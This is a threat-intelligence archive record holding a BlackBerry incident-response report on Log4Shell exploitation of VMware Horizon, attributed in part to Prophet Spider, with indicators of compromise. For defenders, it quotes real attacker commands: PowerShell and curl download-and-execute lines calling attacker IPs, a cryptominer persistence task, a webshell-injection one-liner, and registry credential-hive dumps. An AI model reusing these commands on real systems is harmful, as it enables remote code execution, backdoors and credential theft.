{
    "id": "708c4bf8-eeca-44b9-9d54-89fb47b1009b",
    "created_at": "2023-01-12T15:09:17.640599Z",
    "updated_at": "2025-03-27T02:14:05.278297Z",
    "deleted_at": null,
    "sha1_hash": "49f70698c85418830ce696789880ffe519eec322",
    "title": "2022-01-26 - Log4U, Shell4Me",
    "authors": "",
    "file_creation_date": "2022-05-28T01:31:15Z",
    "file_modification_date": "2022-05-28T01:31:15Z",
    "file_size": 1612095,
    "plain_text": "# Log4U, Shell4Me\n\n**blogs.blackberry.com/en/2022/01/log4u-shell4me**\n\nCodi Starks, Ryan Gibson, Will Ikard\n\nThe [BlackBerry Research & Intelligence and](https://blogs.blackberry.com/en/author/the-blackberry-research-and-intelligence-team) [Incident Response (IR) teams have found evidence correlating attacks by the Initial](https://www.blackberry.com/us/en/services/incident-response)\nAccess Broker (IAB) group Prophet Spider with exploitation of the Log4j vulnerability in VMware Horizon. This article highlights\nthe recent indicators of compromise (IoCs) that we’ve observed.\n\nDefenders concerned that they may have been a victim of these attacks can make use of these IoCs and detection methods to\nidentify evidence of compromise within their environment.\n\n### What is Log4Shell?\n\n[“Log4Shell” is a moniker used to refer to a combination of remote code execution (RCE) vulnerabilities (CVE-2021-44228,](https://blogs.blackberry.com/en/2021/12/the-log4shell-log4j-vulnerability-cve-2021-44228-explained) CVE2021-45046, [CVE-2021-44832) identified in Apache Log4j, a logging framework based on Java which is incorporated into Apache](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44832)\nweb servers all over the world. Due to Log4j’s popularity in many applications (including VMware), combined with the severity of\nthe exploit, security teams were recently left scrambling in the wake of widespread exploitation of this new attack vector.\n\nThe exact number of applications (and the various versions) affected by these vulnerabilities may never be fully known. Although\n[VMware released a patch and mitigation guidance in December 2021 in response to the vulnerability, many implementations](https://www.vmware.com/security/advisories/VMSA-2021-0028.html)\n[remain unpatched, leaving them susceptible to exploitation.](https://www.darkreading.com/threat-intelligence/prophet-spider-exploits-weblogic-cves-to-enable-ransomware-attacks)\n\n\n-----\n\n### Initial Detection\n\nBlackBerry researchers have observed that the exploit could be reliably detected by monitoring child processes of the\nws_TomcatService.exe parent process, as this is the same Tomcat service used by VMware Horizon. In all observed cases,\nexploitation of the ws_TomcatService.exe process spawned either cmd.exe or powershell.exe as child processes.\n\n_Figure 1: Parent and child process relationship_\n\n### Post Exploitation Activity\n\nUpon exploiting the vulnerability, threat actors most commonly used encoded PowerShell commands to download a second-stage\npayload to the victimized systems. The specifics of that payload depend on the attacker’s motives and goals; for example,\ncryptomining, or ransomware and extortion.\n\nWhile BlackBerry primarily observed the threat actors installing cryptocurrency mining software on the affected systems, Cobalt\nStrike beacons were also discovered in some instances.\n\n**Encoding Examples**\n\ncmd /C \"powershell -NonI -W Hidden -NoP -Exec Bypass -Enc <Base64 Encoded Command>\n\npowershell.exe -Enc <Base64 Encoded Command>\n\nOnce decoded, the resulting code used one of two methods to download the second-stage payload. The first and more common\nmethod was the use of PowerShell’s System.Net.Webclient class, along with the DownloadString, DownloadData, or\nDownloadFile methods.\n\n**Typical Download Cradle**\n\nIEX (New-Object Net.WebClient).DownloadString(‘<URL>’)\n\nAlternatively, there were also cases where the threat actor attempted to use the curl.exe binary file to download additional files to\nthe system. The attacker then attempted to execute the downloaded content using the Windows Subsystem for Linux (WSL) bash\nutility.\n\n**Curl Download Attempt**\n\ncmd /C \"curl <URL> | bash\"\n\nBlackBerry threat researchers identified multiple different cryptocurrency miners that were deployed after successful exploitation\nby threat actors. One example used Powershell to download and execute the “xms.ps1” file containing the cryptominer.\n\n**Cryptocurrency Miner Download Example**\n\npowershell iex(New-Object Net.WebClient).DownloadString('hxxp://80.71.158[.]96/xms.ps1')\n\nThe script then created a Scheduled Task, which was used to establish persistence, as well as for storing command-and-control\n(C2) and wallet configurations.\n\n**Scheduled Task Creation**\n\n\n-----\n\nC:\\Windows\\system32\\schtasks.exe /create /F /sc minute /mo 1 /tn BrowserUpdate /tr\n\n\"C:\\Windows\\system32\\config\\systemprofile\\AppData\\Roaming\\network02.exe --donate-level 1 -o b.oracleservice[.]top -o\n198.23.214[.]117:8080 -o 51.79.175[.]139:8080 -o 167.114.114[.]169:8080 -u\n46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ\n-p x -B\"\n\nWe also discovered instances where a webshell file was injected into absg-worker.js and the VMBlastSG service restarted to\n[allow for connections to the webshell, as described in this warning posted by the National Health Service for the UK. Webshells](https://digital.nhs.uk/cyber-alerts/2022/cc-4002)\nare difficult to detect backdoors that threat actors use to maintain stealthy persistence in a victim’s environment.\n\nTo accomplish this injection, threat actors search for the file path to the VMBlastSg service, then change the file name in the path\nfrom NSSM.exe to absg-worker.js. Next, the content of the absj-worker.js file is modified to force the creation of a child process\nwhen the file is called via a browser. Then the VMBlastSG service is restarted, and the webshell is available to the attacker.\n\n**Webshell Creation**\n\npowershell -c \"$path=gwmi win32_service|?{$_.Name -like \"\"\"*VMBlastSG*\"\"\"}|%{$_.PathName -replace '\"\"\"', '' -replace\n\"\"\"nssm.exe\"\"\",\"\"\"lib\\absg-worker.js\"\"\"};$expr=\"\"\"req.connection.end();}if\n(String(req.url).includes('lxmvvZ3S4o250Tw22Z9vTao0cJFmkplDoi828cVwQtZVj3eUbb')) {try\n\n{replyError(req, res, 200, require('child_process').execSync(Buffer.from(req.headers['data'],\n'base64').toString('ascii')).toString());}catch (err) {replyError(req, res, 400,\n\nerr.stderr.toString());}return;\"\"\";(Get-Content $path)|ForEach-Object {$_ -replace\n\n\"\"\"req.connection.end\\(\\)\\;\"\"\", $expr}|Set-Content $path;Restart-Service -Force VMBlastSG\"\n\nBlackBerry researchers observed several instances of cleanup actions taken by threat actors following the miner installation, to\nhelp cover their tracks. (After all, everyone appreciates a tidy and thoughtful threat actor!)\n\n**Cleanup Examples**\n\n“C:\\Windows\\system32\\cmd.exe\" /c del /f /q C:\\ProgramData\\Oracle\\Java\\java.exe”\n\n“C:\\Windows\\System32\\Wbem\\WMIC.exe\" process where \"ExecutablePath like 'c:\\\\windows\\\\temp\\\\%'\" delete\n\n\"C:\\Windows\\System32\\Wbem\\WMIC.exe\" process where \"ExecutablePath like 'C:\\\\Users\\\\\\\\AppData\\\\Local\\\\Temp\\\\%'\" delete\n\n\"C:\\Windows\\system32\\cmd.exe\" /c del /f /q C:\\ProgramData\\nTNLLnvWzl\\pythonhs.exe\n\n\"C:\\Windows\\system32\\cmd.exe\" /c del /f /q %tmp%\\sysupdate.exe\n\n\"C:\\Windows\\System32\\Wbem\\WMIC.exe\" process where \"ExecutablePath like\n'C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\%'\" delete\n\n\"C:\\Windows\\system32\\schtasks.exe\" /delete /tn * /F\n\nIn additional instances of post-exploitation deployment, the threat actor downloaded and installed a Cobalt Strike beacon to the\ninfected systems.\n\n**Cobalt Strike Download Cradle**\n\nIEX ((New-Object System.Net.WebClient).DownloadString('hxxp://185.112.83[.]116:8080/drv'))\n\n\n-----\n\nWe were able to retrieve a copy of the Cobalt Strike configuration, which indicated that successful execution of the Cobalt Strike\nbeacon would spawn either a 32- or 64-bit version of rundll32.exe containing the beacon payload. The following User-Agent string\nwas hard-coded into the beacon configuration.\n\n**Cobalt Strike Beacon User-Agent String**\n\nMozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.3; .NET CLR 2.0.50727)\n\n### Prophet Spider Commonalities\n\nIn addition to the mass deployment of cryptocurrency mining software and Cobalt Strike beacons, BlackBerry researchers also\ndiscovered an instance of exploitation containing tactics, techniques, and procedures (TTPs) relating to the Prophet Spider IAB.\nThis threat group is known to compromise networks and later sell access to ransomware operators. We discussed a similar group\n[called Zebra2104 in our recent report, “Hunter Becomes Hunted: Zebra2104 Hides a Herd of Malware.”](https://blogs.blackberry.com/en/2021/11/zebra2104)\n\nOne of the indicators that helped us attribute the event to this threat group was their use of the C:\\Windows\\Temp\\7fde\\ folder\npath to store malicious files. The threat actor also downloaded a copy of the wget.bin executable, which has historically been\nused by the group to get additional files onto infected hosts. The IP used in the download cradle has also been previously\nattributed to the Prophet Spider group.\n\n**wget.bin Download**\n\npowershell -Command (New-Object\n\nSystem.Net.WebClient).DownloadFile('hxxp://149.28.200[.]140:443/wget.bin','C:\\Windows\\temp\\wget.bin')\n\nAfter downloading the wget.bin executable, the file was then used to download two additional executables named ve.bin and\nwinntaa.exe.\n\n**Additional Payloads**\n\nwget[.]bin -t 1 hxxp://149.28.200[.]140:443/ve.bin\n\nwget[.]bin -t 1 hxxp://149.28.200[.]140:443/winntaa.exe -O c:\\windows\\temp\\winntaa.exe\n\nNext, the attacker began their attempts to enumerate basic information about the network and domain.\n\n**Enumeration**\n\nsysteminfo\n\ntasklist\n\nipconfig /all\n\nquser\n\nnet user\n\nnet group \"Domain Admins\" /domain\n\nnet user Administrator\n\nnltest /domain_trusts\n\nLastly, the threat actor attempted to harvest credentials from the registry.\n\n**Credential Harvesting**\n\nreg save hklm\\sam c:\\windows\\temp\\7fde\\sam\n\nreg save hklm\\system c:\\windows\\temp\\7fde\\system\n\nreg save hklm\\security c:\\windows\\temp\\7fde\\security\n\n\n-----\n\n### Steps to Mitigation\n\nSays [Tony Lee, Vice President of Global Services Technical Operations at BlackBerry, \"If an organization can pay a ransom or](https://www.linkedin.com/in/tonyleevt/)\ncan be turned into a cryptomining farm, they can expect to be a target. (Read: Nearly every organization.) The simple answer for\nmitigating steps is to patch all vulnerable instances of Log4j, along with all other vulnerabilities – however, it is never that simple.\"\n\nLee continues: \"While a robust vulnerability management program is an absolute must, it is not the only solution. A layered\n[defense that includes 24x7 monitoring, threat intel overlay, threat hunting, and AI-based endpoint protection helps in quickly](https://www.blackberry.com/us/en/products/unified-endpoint-security/cylance-ai)\nidentifying and mitigating breaches. The faster a compromise such as this is detected and mitigated, the better the chance of\ndodging the follow-on ransomware attack.\"\n\n### Conclusion\n\nWhen an initial access broker group takes interest in a vulnerability whose scope may never be known, this gives us a good\nindication that they see significant value in its exploitation. It’s likely that we will continue to see criminal groups exploring the\nopportunities of the Log4Shell vulnerability in the near future, as IT teams and users continue to scramble to address these\nvulnerabilities.\n\nAs this situation unfolds and we discover new information, BlackBerry threat researchers will continue to provide intelligence and\nguidance to help defenders protect against threats that take advantage of the situation.\n\n### Indicators of Compromise (IoCs)\n\n**IOC** **Type**\n\nc:\\windows\\system32\\config\\systemprofile\\mimu\\nssm.exe File Path\n\nc:\\windows\\system32\\config\\systemprofile\\mimu2\\nssm.exe File Path\n\nC:\\Windows\\system32\\config\\systemprofile\\mimu\\xmrig.exe File Path\n\nc:\\windows\\temp\\winntaa.exe File Path\n\nC:\\Windows\\temp\\wget.bin File Path\n\nC:\\Windows\\system32\\config\\systemprofile\\AppData\\Roaming\\network02.exe File Path\n\nC:\\Windows\\TEMP\\network02.exe File Path\n\nhxxp://149.28.200[.]140:443/wget.bin URL\n\nhxxp://lurchmath[.]org/wordpress-temp/wp-content/plugins/xmrig.zip URL\n\nhxxp://72.46.52[.]135/mad_micky.bat URL\n\nhxxp://api.rogerscorp[.]org:80 URL\n\nhxxp://80.71.158[.]96/xms.ps1 URL\n\nhxxp://149.28.200[.]140:443/winntaa.exe URL\n\nhxxp://185.112.83[.]116:8080/drv URL\n\n\n-----\n\nhxxp://137.184.17[.]252:443/dd.ps1 URL\n\nhxxp://101.79.1[.]118/2.ps1 URL\n\nhxxp://72.46.52[.]135/kill.bat URL\n\nkill.bat File\n\nxms.ps1 File\n\nmad_micky.bat File\n\nxmrig.zip File\n\nwget.bin File\n\ndd.ps1 File\n\n2.ps1 File\n\nabsg-worker.js File\n\n138.68.246[.]18 IP\n\n140.246.171[.]141 IP\n\n149.28.200[.]140:443 IP/Port\n\n150.158.189[.]96 IP\n\n159.65.48[.]154 IP\n\n167.114.114[.]169:8080 IP/Port\n\n167.71.13[.]196 IP\n\n170.210.45[.]163 IP\n\n175.6.210[.]66 IP\n\n185.112.83[.]116:8080 IP/Port\n\n185.220.100[.]240 IP\n\n185.220.100[.]241 IP\n\n185.220.100[.]244 IP\n\n185.220.100[.]251 IP\n\n\n-----\n\n185.220.100[.]252 IP\n\n185.220.101[.]152 IP\n\n185.220.101[.]158 IP\n\n185.220.101[.]171 IP\n\n185.220.101[.]184 IP\n\n185.220.101[.]188 IP\n\n185.220.101[.]190 IP\n\n185.220.101[.]36 IP\n\n185.220.101[.]53 IP\n\n185.220.102[.]248 IP\n\n185.56.80[.]65 IP\n\n192.160.102[.]170 IP\n\n194.48.199[.]78 IP\n\n198.23.214[.]117:8080 IP/Port\n\n198.98.56[.]151 IP\n\n216.144.180[.]171 IP\n\n23.129.64[.]218 IP\n\n23.236.146[.]162 IP\n\n45.146.165[.]168 IP\n\n45.154.255[.]147 IP\n\n45.61.146[.]242 IP\n\n5.157.38[.]50 IP\n\n51.222.121[.]180 IP\n\n51.79.175[.]139:8080 IP/Port\n\n62.102.148[.]68 IP\n\n\n-----\n\n72.46.52[.]135:80 IP/Port\n\n79.172.212[.]132 IP\n\n80.71.158[.]96:80 IP/Port\n\nb.oracleservice[.]top Domain\n\napi.rogerscorp[.]org Domain\n\n### Decoded PowerShell Events\n\npowershell -c \"$path=gwmi win32_service|?{$_.Name -like \"\"\"*VMBlastSG*\"\"\"}|%{$_.PathName -replace\n\n'\"\"\"', '' -replace \"\"\"nssm.exe\"\"\",\"\"\"lib\\absg-worker.js\"\"\"};$expr=\"\"\"req.connection.end();}if\n(String(req.url).includes('lxmvvZ3S4o250Tw22Z9vTao0cJFmkplDoi828cVwQtZVj3eUbb')) {try {replyError(req,\n\nres, 200, require('child_process').execSync(Buffer.from(req.headers['data'],\n\n'base64').toString('ascii')).toString());}catch (err) {replyError(req, res, 400,\n\nerr.stderr.toString());}return;\"\"\";(Get-Content $path)|ForEach-Object {$_ -replace\n\n\"\"\"req.connection.end\\(\\)\\;\"\"\", $expr}|Set-Content $path;Restart-Service -Force VMBlastSG\"\n\ncmd /c c:\\windows\\temp\\winntaa.exe\n\npowershell -Command (New-Object\n\nSystem.Net.WebClient).DownloadFile('hxxp://149.28.200[.]140:443/wget.bin','C:\\Windows\\temp\\wget.bin')\n\ncmd /c c:\\windows\\temp\\wget.bin -t 1 hxxp://149.28.200[.]140:443/winntaa.exe -O c:\\windows\\temp\\winntaa.exe\n\npowershell -c curl -uri hxxp://api.rogerscorp[.]org:80 -met POST -Body\n([System.Convert]::ToBase64String(([System.Text.Encoding]::ASCII.GetBytes((echo 216.144.180[.]171)))))\n\niex ((New-Object System.Net.WebClient).DownloadString('hxxp://185.112.83[.]116:8080/drv'))\n\n$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile +=\n\n'.bat'; $wc.DownloadFile('hxxp://72.46.52[.]135/mad_micky.bat', $tempfile); & $tempfile\n\ncmd /C \"curl 72.46.52[.]135/dl.sh | bash\"\n\npowershell iex(New-Object Net.WebClient).DownloadString('hxxp://80.71.158[.]96/xms.ps1')\n\npowershell -exec bypass -c IEX(New-Object Net.WebClient).DownloadString('hxxp://137.184.17[.]252:443/dd.ps1')\n\nIEX (New-Object Net.WebClient).DownloadString('hxxp://101.79.1[.]118/2.ps1')\n\n$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile +=\n\n'.bat'; $wc.DownloadFile('hxxp://72.46.52[.]135/kill.bat', $tempfile); & $tempfile\n\npowershell iex(New-Object Net.WebClient).DownloadString('hxxp://80.71.158[.]96/xms.ps1')\n\n### Victim of an Attack?\n\n\n-----\n\n[If you believe you have already been the victim of an attack, please contact us, regardless of your existing BlackBerry](https://www.blackberry.com/us/en/forms/cylance/handraiser/emergency-incident-response-containment)\nrelationship.\n\n[The BlackBerry Incident Response team is made up of world-class consultants dedicated to handling response and containment](https://www.blackberry.com/us/en/services/incident-response)\nservices for a wide range of incidents, including ransomware and Advanced Persistent Threat (APT) cases.\n\n## About Codi Starks\n\n**Senior Professional Services Incident Response Consultant at BlackBerry.**\n\n**[Codi Starks has more than twelve years of IT, cybersecurity, and incident response experience. During his time in the field he](https://www.linkedin.com/in/codi-starks-b3a0ab61/)**\nhas supported and led difficult incident response engagements for Fortune 500 companies spanning multiple continents.\n\nHe currently holds several certifications and achievements, including an M.S. in Information Security and Assurance, as well as\nthe OSCP and SANS GCFE certifications. He has won multiple cybersecurity competitions, including OpenSOC, SANS DFIR\nNetwars, and SOCX.\n\n## About Ryan Gibson\n\n**Principal Threat Researcher at BlackBerry.**\n\n[A seasoned security professional, Ryan Gibson has been in the security industry for over a decade. He has in-depth knowledge](https://www.linkedin.com/in/ryan-gibson-threat-intel/)\nof Incident Response, Disk and Memory Forensics, Malware Analysis, Threat Intelligence/Threat Hunting, Splunk, and many\nother security tools. Prior to BlackBerry, Ryan worked as a Senior Information Security Engineer at Qualcomm.\n\n## About Will Ikard\n\n**Principal Incident Response & Forensics Consultant at BlackBerry.**\n\n\n-----\n\n[As a Principal Incident Response & Forensics Consultant, Will Ikard is responsible for overseeing BlackBerry s incident response](https://www.linkedin.com/in/will-ikard-90646411/)\nengagements throughout the United States by providing consulting services to clients, including digital forensics, incident\ncontainment, malware reverse engineering, compromise assessments, and other security services across the spectrum of\nincidents types ranging from malware to advanced adversaries. Will also contributes to the development of BlackBerry's Incident\nResponse methodology and tools.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-01-26 - Log4U, Shell4Me.pdf"
    ],
    "report_names": [
        "2022-01-26 - Log4U, Shell4Me.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "056826cb-6e17-4954-a9b4-2cc8c6ae3cb8",
            "created_at": "2023-03-04T02:01:54.115678Z",
            "updated_at": "2025-03-27T02:00:03.125249Z",
            "deleted_at": null,
            "main_name": "Prophet Spider",
            "aliases": [
                "GOLD MELODY",
                "UNC961"
            ],
            "source_name": "MISPGALAXY:Prophet Spider",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "47b52642-e5b8-4502-b714-b625002d86aa",
            "created_at": "2024-06-19T02:03:08.086579Z",
            "updated_at": "2025-03-27T02:05:17.385492Z",
            "deleted_at": null,
            "main_name": "GOLD MELODY",
            "aliases": [
                "UNC961",
                "PROPHET SPIDER"
            ],
            "source_name": "Secureworks:GOLD MELODY",
            "tools": [
                " 7-ZIP",
                " AUDITUNNEL",
                " BURP Suite",
                " GOTROJ",
                " JSP webshells",
                " Mimikatz",
                " Wget",
                "7-ZIP"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673536157,
    "ts_updated_at": 1743041645,
    "ts_creation_date": 1653701475,
    "ts_modification_date": 1653701475,
    "files": {
        "pdf": "https://archive.orkl.eu/49f70698c85418830ce696789880ffe519eec322.pdf",
        "text": "https://archive.orkl.eu/49f70698c85418830ce696789880ffe519eec322.txt",
        "img": "https://archive.orkl.eu/49f70698c85418830ce696789880ffe519eec322.jpg"
    }
}